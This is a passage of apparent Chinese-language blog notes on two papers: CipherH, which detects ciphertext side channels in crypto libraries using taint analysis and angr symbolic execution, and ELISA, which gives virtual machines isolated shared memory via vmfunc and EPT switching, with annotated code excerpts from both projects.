href=\"https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/tainted_func.txt\">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;tainted_func.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>猜测最后的结果记录了函数名和对应的taint位置 包括6个参数寄存器、返回值、从内存加载</p>\n<ol>\n<li>任何输入 都是taint的</li>\n<li>返回值是taint</li>\n<li>从memory load了taint data</li>\n</ol>\n<p>对密码学算法库来说不需要构造很多覆盖面广的input  很多input其实涉及到的逻辑都一样</p>\n<p>不过其实筛掉大部分的function  然后留下function name和taint symbol name就可以了</p>\n<h3 id=\"符号执行\"><a href=\"#符号执行\" class=\"headerlink\" title=\"符号执行\"></a>符号执行</h3><p>符号执行阶段 从第一阶段拿到足够的信息以后 可以对每个function单独进行符号执行 if生成约束  然后根据taint信息生成一个表达式 求解</p>\n<p>因为这边不加混淆 所以代码应该比较容易被逆向 比如$0x10(rsp) 就可以认为是同一个指针</p>\n<p>syntactical equivalence   和angr现有的一样 保证效率</p>\n<h4 id=\"intra\"><a href=\"#intra\" class=\"headerlink\" title=\"intra\"></a>intra</h4><p>遇到if 加约束</p>\n<p>遇到call 直接用symbol  根据taint analysis的结果可以知道这里的symbol用普通的s还是taint的k</p>\n<p>M 中的元组a,v 表示symbol v写到地址a</p>\n<p>W中的元组a,v,i表示指令i把数据v写到地址a</p>\n<ol>\n<li>检查v是否包含key</li>\n<li>是否存在a1&#x3D;a 且v1也包含key</li>\n<li>放入Eq4看看是否可满足 (带上之前if导致的一系列条件)</li>\n<li>SMT solver返回是否可满足 并给出例子 留给user后续手动分析</li>\n</ol>\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/src/run.py\">CipherH&#x2F;src&#x2F;run.py at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>hook了每次内存读写的操作  回调的时候有当前所有的状态 包括这句内存读写操作的AST</p>\n<p>AST中包括symbol的表达式</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">initial_state.inspect.b(<span class=\"string\">&#x27;instruction&#x27;</span>, action=track_instr)</span><br><span class=\"line\">initial_state.inspect.b(<span class=\"string\">&#x27;mem_write&#x27;</span>, when=angr.BP_BEFORE,action=track_write_mem_before)</span><br><span class=\"line\">initial_state.inspect.b(<span class=\"string\">&#x27;mem_read&#x27;</span>, when=angr.BP_BEFORE, action=track_read_mem_before)</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> fun_name <span class=\"keyword\">in</span> tainted_func:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">128</span> == <span class=\"number\">128</span>:</span><br><span class=\"line\">    initial_state.regs.rdi = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">64</span> == <span class=\"number\">64</span>:</span><br><span class=\"line\">    initial_state.regs.rsi = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">32</span> == <span class=\"number\">32</span>:</span><br><span class=\"line\">    initial_state.regs.rdx = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>)           </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">16</span> == <span class=\"number\">16</span>:</span><br><span class=\"line\"></span><br><span class=\"line\">    initial_state.regs.rcx = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">8</span> == <span class=\"number\">8</span>:</span><br><span class=\"line\">    initial_state.regs.r8 = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>) </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> tainted_func[fun_name] &amp; <span class=\"number\">4</span> == <span class=\"number\">4</span>:</span><br><span class=\"line\">    initial_state.regs.r9 = initial_state.solver.BVS(<span class=\"string\">&quot;k&quot;</span>, <span class=\"number\">64</span>) </span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">l = <span class=\"built_in\">len</span>(state.ch.chain)//<span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> l &gt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">    l = l - <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">1</span>] <span class=\"keyword\">is</span> state.inspect.mem_write_address:</span><br></pre></td></tr></table></figure>\n\n<p>四个一组 循环找 所以chain就是论文中的W和M</p>\n<p><a href=\"https://www.cnblogs.com/level5uiharu/p/16932453.html\">欢迎回来(。・∀・)ノ (cnblogs.com)</a></p>\n<p>这里chain和expr应该都是AST key要么在arg0要么在arg1 </p>\n<p>第一个条件是判断是否相等 第二个条件是判断换一个变量是否可以不等(把key换成另一个symbol)</p>\n<p>这里虽然名字都是sol 但实际上都是两个不同的symbol 比如sol_22 sol_23</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>  temp1 == <span class=\"string\">&#x27;__add__&#x27;</span> <span class=\"keyword\">and</span> temp2 ==  <span class=\"string\">&#x27;__add__&#x27;</span> :</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;k&#x27;</span> <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>].args[<span class=\"number\">0</span>]):</span><br><span class=\"line\">    \ttemp3 = state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>] - state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>].args[<span class=\"number\">0</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    \ttemp3 = state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>] - state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>].args[<span class=\"number\">1</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))                                       </span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&#x27;k&#x27;</span> <span class=\"keyword\">in</span> <span class=\"built_in\">str</span>(state.inspect.mem_write_expr.args[<span class=\"number\">0</span>]):</span><br><span class=\"line\">    \ttemp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class=\"number\">0</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    \ttemp4 = state.inspect.mem_write_expr - state.inspect.mem_write_expr.args[<span class=\"number\">1</span>] + state.solver.BVS(<span class=\"string\">&quot;sol&quot;</span>,  <span class=\"built_in\">int</span>(b))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> state.solver.satisfiable(extra_constraints=[state.ch.chain[<span class=\"number\">4</span>*l+<span class=\"number\">3</span>] == state.inspect.mem_write_expr, temp3 != temp4]):</span><br><span class=\"line\">    \t<span class=\"built_in\">print</span>(<span class=\"string\">&quot;bug in &#123;&#125; for &#123;:x&#125; and &#123;:x&#125;&quot;</span>.<span class=\"built_in\">format</span>(fun_name, state.ch.chain[<span class=\"number\">4</span>*l], state.inspect.instruction), file=f_result)                     </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这里等号的含义是，是否存在某一组symbol的组合(k1 k2 k3 k4) 使得取值可以相等(64bit整数)</p>\n<p>W1 W2应该表示连续两次读 (i变i+1 或f前和f后)</p>\n<p><strong>ch.chain和inspect.mem_write_expr</strong>是什么？  好像后者就是前者的4l+2?</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">state.ch.chain = state.ch.chain + [state.inspect.instruction]</span><br><span class=\"line\">state.ch.chain = state.ch.chain + [state.inspect.mem_write_address]</span><br><span class=\"line\">a = <span class=\"built_in\">str</span>(state.inspect.mem_write_expr)</span><br><span class=\"line\">b = a[<span class=\"number\">3</span>:<span class=\"number\">5</span>]</span><br><span class=\"line\">state.ch.chain = state.ch.chain + [b]</span><br><span class=\"line\">state.ch.chain = state.ch.chain + [state.inspect.mem_write_expr]</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><a href=\"https://github.com/Sen-Deng/CipherH/blob/master/evaluation_result/wolfssl_rsa_o0/symbolic_exec/result.txt\">CipherH&#x2F;evaluation_result&#x2F;wolfssl_rsa_o0&#x2F;symbolic_exec&#x2F;result.txt at master · Sen-Deng&#x2F;CipherH (github.com)</a></p>\n<p>这个地址应该就是二进制文件里面的地址 非常精确 供之后手动分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bug in fp_rshb for 41cc2a and 41cc2a</span><br><span class=\"line\">bug in fp_rshb for 41cc63 and 41cc63</span><br><span class=\"line\"></span><br><span class=\"line\">bug in _fp_exptmod_ct for 41ee25 and 41ee5c</span><br><span class=\"line\">bug in _fp_exptmod_ct for 41ee4b and 41ee4b</span><br><span class=\"line\">bug in _fp_exptmod_ct for 41ee5c and 41ee5c</span><br><span class=\"line\">bug in _fp_exptmod_ct for 41f04b and 41f04b</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"inter\"><a href=\"#inter\" class=\"headerlink\" title=\"inter\"></a>inter</h4><p>同一块内存会在函数调用间被写</p>\n<ul>\n<li>频繁调用</li>\n<li>callee至少一个参数是tainted</li>\n</ul>\n<p>没有加约束求解 所以可能带来false positives</p>\n<blockquote>\n<p>In all, during our intra-procedural analysis, we use symbolic execution to traverse each path of a tainted function Fc. During the traversal, we search for every encountered callee function and decide if any callee function F meets the aforementioned patterns. If so, we will proceed further to launch intra-procedural symbolic execution toward F, and decide if F has memory write instructions whose content is derived from its tainted parameters. If so, we would conclude that F enables ciphertext side channels, assuming multiple runs of F from Fc write secrets into the same memory address.  </p>\n</blockquote>\n<p>只要callee F用taint 写了内存就认为会带来side channel</p>\n","categories":["papers"]},{"title":"ELISA","url":"/2024/05/04/papers/ELISA/","content":"<h1 id=\"ELISA\"><a href=\"#ELISA\" class=\"headerlink\" title=\"ELISA\"></a>ELISA</h1><p><a href=\"https://github.com/yasukata/ELISA?tab=readme-ov-file#section-41--anywhere-page-table-apt\">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>\n<p>主要是elisa的设计实现了带隔离的共享内存 network的use case可以做到比vhost-net更好</p>\n<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>虚拟机间需要共享数据</p>\n<ul>\n<li>共享内存 效率高 隔离性低 guest代码不可信</li>\n<li>host介入 例如hypercall 隔离性好 效率低</li>\n</ul>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135854799.png\" alt=\"image-20240221135854799\" style=\"zoom:50%;\" />\n\n<ul>\n<li>share一块设备的DMA区域</li>\n<li>trafficDB</li>\n</ul>\n<p>ELISA通过vmfunc切换EPT页表实现安全高效的资源共享</p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221140438142.png\" alt=\"image-20240221140438142\" style=\"zoom:50%;\" />\n\n<h2 id=\"EPTP\"><a href=\"#EPTP\" class=\"headerlink\" title=\"EPTP\"></a>EPTP</h2><img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221151320704.png\" alt=\"image-20240221151320704\" style=\"zoom:50%;\" />\n\n<p><a href=\"https://www.cnblogs.com/Rev-omi/p/14063037.html\">第10章：VT 技术（简单了解+EPT 机制） - Rev_omi - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.usenix.org/sites/default/files/conference/protected-files/atc18_slides_hua.pdf\">atc18_slides_hua.pdf (usenix.org)</a></p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135313661.png\" alt=\"image-20240221135313661\" style=\"zoom:50%;\" />\n\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135431450.png\" alt=\"image-20240221135431450\" style=\"zoom:50%;\" />\n\n<p>EPTP: EPT四级页表的root</p>\n<p>传统hypervisor只需要为每个guest配置一套EPT就可以 intel允许配置512个</p>\n<p>改完EPT以后 GPA-&gt;HPA映射改变 所有数据都变了 包括代码和页表</p>\n<p>所以大部分都是不改的 只改需要改的部分 例如代码</p>\n<ul>\n<li>原本不能访问的 现在可以访问</li>\n<li>代码段4k页结束以后 变到了新的代码段上了</li>\n</ul>\n<h2 id=\"challange\"><a href=\"#challange\" class=\"headerlink\" title=\"challange\"></a>challange</h2><p>EPT context 指每个EPTP对应的四级页表</p>\n<p>需要保证guest 页表数据不变(否则会crash) 所以guest 页表GPA-&gt;HPA不能变</p>\n<p> 所以guest改cr3必须下陷同步修改EPT？</p>\n<p>修改EPT以后代码在哪？  理论：通过固定GVA去call vmfunc 实际：恶意guest可以控制页表和cr3 导致可以任意GVAcall 绕过判断</p>\n<h2 id=\"design\"><a href=\"#design\" class=\"headerlink\" title=\"design\"></a>design</h2><p>三种EPT context</p>\n<ul>\n<li>default 不可信</li>\n<li>gate 可信</li>\n<li>sub 可信</li>\n</ul>\n<p>Manager VM：可信部分 方便用user-space的tool 代替了kernel的hypervisor 去配置EPT</p>\n<h3 id=\"APT\"><a href=\"#APT\" class=\"headerlink\" title=\"APT\"></a>APT</h3><p>APT是为了消除CR3的trap和update开销</p>\n<p>vmfunc之后 GPA-&gt;HPA映射改变 还是在guest内 因此想要执行目标代码 绕不开地址翻译</p>\n<p>让所有的GPA都指向提前配置好的guest页表基地址 这样不论cr3的值是什么 都可以正确翻译</p>\n<p>因此其他用到的内存 例如栈 共享变量 代码都必须在guest合法GPA之外 例如256G</p>\n<h3 id=\"gate\"><a href=\"#gate\" class=\"headerlink\" title=\"gate\"></a>gate</h3><img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221135535967.png\" alt=\"image-20240221135535967\" style=\"zoom:50%;\" />\n\n<p><a href=\"https://www.usenix.org/conference/usenixsecurity20/presentation/mi\">(Mostly) Exitless VM Protection from Untrusted Hypervisor through Disaggregated Nested Virtualization | USENIX</a></p>\n<p>防止VM 随意切换EPTP bypass掉可信部分 用动态修改EPTP list的技术 </p>\n<p>初始化情况下 EPTP list 只有default 和gate 两个entry</p>\n<p>切换到gate的时候动态加入sub到EPTP list</p>\n<p>sub回到default之前再把sub从EPTP list里面删了</p>\n<p>dlopen加载可信代码 映射到sub EPT</p>\n<p>gate隔离开def和sub 加简单的check就可以</p>\n<h2 id=\"network\"><a href=\"#network\" class=\"headerlink\" title=\"network\"></a>network</h2><p>VM-&gt;虚拟网卡-&gt;qemu&#x2F;kvm-&gt;内核网桥-&gt;物理网卡</p>\n<p>[KVM 介绍（4）：I&#x2F;O 设备直接分配和 SR-IOV <a href=\"https://www.cnblogs.com/sammyliu/p/4548194.html\">KVM PCI&#x2F;PCIe Pass-Through SR-IOV] - SammyLiu - 博客园 (cnblogs.com)</a></p>\n<p>PCI passthrough 设备直通 一个网卡给一个虚拟机用</p>\n<p>SRIOV也是设备直通 但是有一个网卡给多个虚拟机用的能力</p>\n<p>virtual switch是sub context共享的 物理NIC的IO buffer和DMA是sub context共享的</p>\n<p>vNIC的io buffer是def和sub共享的</p>\n<p>virtual switch用了VALE&#x2F;mswitch netmap</p>\n<p>VNIC driver是DPDK写的  user application也要用DPDK去通信</p>\n<p>发包</p>\n<ol>\n<li>vNIC把数据放到IObuffer def和sub shared</li>\n<li>vmfunc</li>\n<li>virtual switch拷贝到目标NIC</li>\n<li>virtual switch trigger sub中的physical NIC driver</li>\n</ol>\n<p>收包</p>\n<ol>\n<li>vNIC</li>\n<li>vmfunc 进入sub</li>\n<li>virtual switch拷贝到vNIC</li>\n</ol>\n<p>PCI passthrough不能被多个VM共用</p>\n<p>转发逻辑完全可编程 和SRIOV不同 后者是硬件代码</p>\n<p>测试用的benchmark都需要基于DPDK的用户进程</p>\n<p><a href=\"https://blog.csdn.net/fengfengdiandia/article/details/52869290\">netmap 介绍-CSDN博客</a></p>\n<p>网络包首发框架 映射网卡packet buffer到用户态</p>\n<p><a href=\"https://conferences.sigcomm.org/sigcomm/2017/files/tutorial-netmap/03-vale.pdf\">03-vale.pdf (sigcomm.org)</a></p>\n<p><a href=\"https://manpages.org/vale/4\">man vale (4): a very fast Virtual Local Ethernet using the netmap API (manpages.org)</a></p>\n<p><a href=\"https://github.com/yasukata/ELISA?tab=readme-ov-file#section-71--vm-networking-system\">yasukata&#x2F;ELISA: ELISA: Exit-Less, Isolated, and Shared Access for Virtual Machines (github.com)</a></p>\n<p><a href=\"https://github.com/yasukata/elisa-app-vmnet/blob/master/client/main.c\">elisa-app-vmnet&#x2F;client&#x2F;main.c at master · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>\n<ol>\n<li><p>guestVM网络请求 被DPDK driver处理<a href=\"https://github.com/yasukata/librte_pmd_rvif/blob/9fbd375484cef415ea61bb6b436d509dca707c87/main.c#L276-L278\">librte_pmd_rvif&#x2F;main.c at 9fbd375484cef415ea61bb6b436d509dca707c87 · yasukata&#x2F;librte_pmd_rvif (github.com)</a></p>\n</li>\n<li><p>先拷贝数据到vNIC iobuf上 这个是def sub共享的</p>\n</li>\n<li><p>然后调用dpdk_rvif_io_hook<a href=\"https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/client/main.c\">elisa-app-vmnet&#x2F;client&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a> 其中do_io会调用elisa_gate_entry</p>\n</li>\n<li><p>触发vmfunc</p>\n</li>\n<li><p>进入sub的entry point 这里entry_function是rvs_fwd</p>\n<p><a href=\"https://github.com/yasukata/elisa-app-vmnet/blob/4a9800ea488aa4ac9b057c3d98f04da35faefab1/server/lib/libelisa-applib-vmnet/main.c#L68\">elisa-app-vmnet&#x2F;server&#x2F;lib&#x2F;libelisa-applib-vmnet&#x2F;main.c at 4a9800ea488aa4ac9b057c3d98f04da35faefab1 · yasukata&#x2F;elisa-app-vmnet (github.com)</a></p>\n<p><a href=\"https://github.com/yasukata/rvs/blob/master/rvs.c\">rvs&#x2F;rvs.c at master · yasukata&#x2F;rvs (github.com)</a></p>\n<p>rvs是单独实现的一个virtual switch</p>\n</li>\n<li><p>virtual switch主要做两件事</p>\n<ul>\n<li>找destination</li>\n<li>拷贝数据到destination NIC的IO buffer</li>\n</ul>\n<p>这部分参考VALE&#x2F;mswitch实现</p>\n</li>\n</ol>\n<h3 id=\"VALE\"><a href=\"#VALE\" class=\"headerlink\" title=\"VALE\"></a>VALE</h3><p>就是一个高性能的virtual switch</p>\n<h3 id=\"hyperNF\"><a href=\"#hyperNF\" class=\"headerlink\" title=\"hyperNF\"></a>hyperNF</h3><ul>\n<li>为了不增加hypervisor的TCB 把基于VALE的vswitch放在一个privilege VM中 实现转发逻辑</li>\n<li>数据和代码export到hypervisor中</li>\n<li>map一些数据结构给VM</li>\n<li>NIC直接连接switch</li>\n</ul>\n<p>transmit</p>\n<ol>\n<li>VM 放数据到packet buffer</li>\n<li>hypercall</li>\n<li>VALE转发逻辑（查询dest地址 拷贝数据）</li>\n<li>hypercall return</li>\n</ol>\n<ul>\n<li>virtio&#x2F;vhost-net是通过hypervisor处理 物理NIC连的是hypervisor上的tap设备</li>\n<li>elisa通过hyperNF的架构 多个VM共享物理NIC的DMA区域 例如加锁使用</li>\n</ul>\n<p>VALE本身就比tap快10-20倍 12年</p>\n<p>hyperNF用了VALE 15年</p>\n<p>发网络包的过程</p>\n<ol>\n<li>guest host通信</li>\n<li>switch转发</li>\n</ol>\n<p>elisa做到的是把通信部分从vm exit变为开销更小的vmfunc 并且用自己实现的高效转发逻辑用sub EPT保护起来 同时实现了隔离性</p>\n<p>baseline：</p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221141207415.png\" alt=\"image-20240221141207415\" style=\"zoom:50%;\" />\n\n\n\n<p>elisa</p>\n<img src=\"C:\\Users\\Shen\\AppData\\Roaming\\Typora\\typora-user-images\\image-20240221141230092.png\" alt=\"image-20240221141230092\" style=\"zoom:50%;\" />\n\n\n\n<h2 id=\"libelisa\"><a href=\"#libelisa\" class=\"headerlink\" title=\"libelisa\"></a>libelisa</h2><p>最终执行流也是通过EPT映射决定的 所以如何构造EPT很关键</p>\n<p>managerVM配置好EPT以后写到eptp_list 通过hypercall告诉kvm  kvm通过写vmcs配置eptp_list 然后vmfunc就可以直接用</p>\n<p>elisa-util-exec会直接执行elisa__exec_init managerVM和guestVM都需要执行elisa-util-exec 这样都执行了shared的mmap</p>\n<p>每个需要共享内存的guest VM作为elisa_client</p>\n<ul>\n<li><h4 id=\"elisa-server-运行在managerVM-死循环\"><a href=\"#elisa-server-运行在managerVM-死循环\" class=\"headerlink\" title=\"elisa_server  运行在managerVM 死循环\"></a><a href=\"https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L67\"><code>elisa_server</code></a>  运行在managerVM 死循环</h4><p>由elisa-util-exec调用到elisa_server 传入elisa__server_cb  elisa__server_exit_cb</p>\n<p>fork后执行server_work</p>\n<p>ELISA_APPLIB_FILE&#x3D;.&#x2F;lib&#x2F;libelisa-applib-nop&#x2F;lib.so 这个文件里面只有一个entry_function</p>\n<p>server_cb(elisa__server_cb)调用elisa_create_program_map_req 解析ELF把entry_function的代码段都放到base_gpa后的一页一页</p>\n<p>shared_memory的指针会被放到代码段页之后的一页</p>\n<p>BASE_GPA是1&lt;&lt;37 即128G</p>\n<p>正常来说8G内存范围就是0-8G 超了访问硬件就会报错<br>但是对于虚拟化 有GPA-&gt;HPA翻译 超出的部分也可以被映射到合法的HPA<br>default EPT不映射超出的部分 non-default EPT映射超出的GPA到HPA</p>\n<p>src_gxa表示可能是gva也可能是gpa 实际上都是gva</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">(*map_req)[*map_req_cnt].dst_gpa = <span class=\"number\">0x1000</span> * *map_req_cnt + base_gpa;</span><br><span class=\"line\">(*map_req)[*map_req_cnt].dst_gva = (phdr.p_vaddr &amp; (~((<span class=\"number\">1UL</span> &lt;&lt; <span class=\"number\">12</span>) - <span class=\"number\">1</span>))) + <span class=\"number\">0x1000</span> * j;</span><br><span class=\"line\">(*map_req)[*map_req_cnt].src_gxa = (phdr.p_vaddr &amp; (~((<span class=\"number\">1UL</span> &lt;&lt; <span class=\"number\">12</span>) - <span class=\"number\">1</span>))) + <span class=\"number\">0x1000</span> * j;</span><br></pre></td></tr></table></figure>\n\n<p>server libelisa这边的BASE_GPA是256G</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">__map_req[i].dst_gva = requested_gva + 0x1000 * i;</span><br><span class=\"line\">__map_req[i].dst_gpa = BASE_GPA + 0x1000 * i;</span><br></pre></td></tr></table></figure>\n\n<p><code>embed_addr_to_code((void *)((uintptr_t) __RUNTIME_VALUE_2 + 2), entry_function);</code></p>\n<p>把entry_function的地址写到sub_context的code中</p>\n<p>setup_vcpu_ept_ctx</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">assert(!gva2hpa(req[i].src_gxa, &amp;hpa));</span><br><span class=\"line\">pt_map(&amp;ctx-&gt;pt, req[i].dst_gva, req[i].dst_gpa, req[i].pt_flags, req[i].level);</span><br><span class=\"line\">pt_map(&amp;ctx-&gt;ept, req[i].dst_gpa, hpa, req[i].ept_flags, req[i].level);</span><br></pre></td></tr></table></figure>\n\n<p>原先src_gva-&gt;hpa 是src_gva是已经存在的一块内存区域</p>\n<p>之后dst_gva-&gt;dst_gpa-&gt;hpa 即用新的guest page table和ept 可以用dst_gva访问到这块数据</p>\n<p>pt_map补全页表 建立映射 pgtbl-&gt;cnt表示四级页表中所有页表的个数 pg[0]表示root页表</p>\n<p>把pt页表的映射再加到EPT中</p>\n<p>只是配好了一个pt和一个ept 包括gate sub用到的代码和stack</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">memcpy</span>((<span class=\"type\">void</span> *) ctx-&gt;apt_mem, (<span class=\"type\">void</span> *) ctx-&gt;pt.pg[<span class=\"number\">0</span>].va, <span class=\"number\">0x1000</span>);</span><br><span class=\"line\">assert(!gva2hpa((<span class=\"type\">uint64_t</span>) ctx-&gt;apt_mem, &amp;hpa));</span><br><span class=\"line\">pt_map(&amp;ctx-&gt;ept, ((<span class=\"type\">uint64_t</span>) <span class=\"number\">-1</span>) &amp; EPT_ADDR_MASK, hpa, EPT_R | EPT_W | <span class=\"comment\">/*EPT_X | EPT_U |*/</span> EPT_MT, <span class=\"number\">1</span>);</span><br></pre></td></tr></table></figure>\n\n\n\n<p>ept把0xfffffffff映射到apt_mem的hpa 这样ept四级页表都会有最后一项</p>\n<p>ae是所有页表的最后一个位置</p>\n<p>遍历ept 把512项的每一项都指向ae 即下一级页表的最后一个位置 这样最终会指向apt_mem的hpa 如果已经有指向了 则递归把下一级的指向apt_mem</p>\n<p>改变整个地址空间的映射 不是遍历整个地址空间为每个va创建映射 而是直接修改page table entry即可</p>\n<p>最终配置完的EPT guest自己所有的GPA都会被映射到apt_mem的HPA  存储的数据是guest page table的root page table</p>\n<p>超出范围的GPA被映射到指定的位置  </p>\n<p>gate EPT会被放到eptp_list的最后一个位置</p>\n<p>set_rendezvous_point_eptp_list_hpa 把eptp_list记录到host</p>\n<p>read等待client结束</p>\n<p>配置完成后 多了两个ept  并且ept的合法GPA范围都指向了一起配置好的pt</p>\n</li>\n<li><h4 id=\"elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出\"><a href=\"#elisa-client-运行在guestVM中-配置完gate-sub-EPT-之后退出\" class=\"headerlink\" title=\"elisa_client 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出\"></a><a href=\"https://github.com/yasukata/elisa-util-exec/blob/eb8a14a132fe7f9b0e7980c7a4ab3a30ef8a465f/main.c#L72\"><code>elisa_client</code></a> 运行在guestVM中 配置完gate&#x2F;sub EPT 之后退出</h4><p> 由elisa-util-exec调用到elisa_client 传入client_cb </p>\n<p>拿到vcpuid</p>\n<p>client_cb 啥也不干</p>\n<p><code>request_gva = (uint64_t) gate_entry_page + 0x1000;</code></p>\n<p>elisa_guest_activate 写入eptp_list</p>\n<p>elisa__client_work 禁止中断 elisa_gate_entry</p>\n<p>____asm_impl_client 定义了elisa_gate_entry  执行vmfunc(511) 切换到gate ept</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">.src_gxa = (<span class=\"type\">uint64_t</span>) gate_ctx_page,</span><br><span class=\"line\">.dst_gva = requested_gva + <span class=\"number\">0x1000</span> * <span class=\"number\">0</span>,</span><br><span class=\"line\">.dst_gpa = BASE_GPA + <span class=\"number\">0x1000</span> * <span class=\"number\">0</span>,</span><br></pre></td></tr></table></figure>\n\n<p>此使pc正好指向下一个page 这个page通过之前配置好的pt和ept 会被映射到gate_ctx_page</p>\n<p>立即切换之后 并不会马上用到stack 因此可以先写一些不需要stack的汇编 然后配置rsp到事先用mmap准备好的栈位置</p>\n<p>gate执行完(code page上半部分) vmfunc 切换视角 继续执行的是sub page的下半部分 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;.globl __RUNTIME_VALUE_2 \\n\\t&quot;</span><br><span class=\"line\">&quot;__RUNTIME_VALUE_2: \\n\\t&quot;</span><br><span class=\"line\">&quot;movabs $0x123456789abcdef0, %rax \\n\\t&quot; // 0x123456789abcdef0 (pointer to entry point function) is replaced at initialization</span><br><span class=\"line\">&quot;call *%rax \\n\\t&quot;</span><br><span class=\"line\">&quot;movq %rax, %rbx \\n\\t&quot; // save return value on rbx</span><br></pre></td></tr></table></figure>\n\n<p>entry_function中的gva是事先准备好映射的 在shared memory例子中 shm_memory_ptr的gva和src_gva相同 gva不变 通过修改映射访问到host物理内存上的事先用mmap shared准备好的共享内存</p>\n<p>entry_function的映射在<a href=\"https://github.com/yasukata/libelisa-extra/blob/master/include/libelisa_extra/map.h\">libelisa-extra&#x2F;include&#x2F;libelisa_extra&#x2F;map.h at master · yasukata&#x2F;libelisa-extra (github.com)</a>中建立 与shared_memory相同 src_gva&#x3D;dst_gva 不变 dst_gpa一个个往后放</p>\n</li>\n</ul>\n<p>def和sub共享 修改def EPT？ 在启动的时候先让manager VM和guest VM通过qemu提供的共享内存</p>\n<p><a 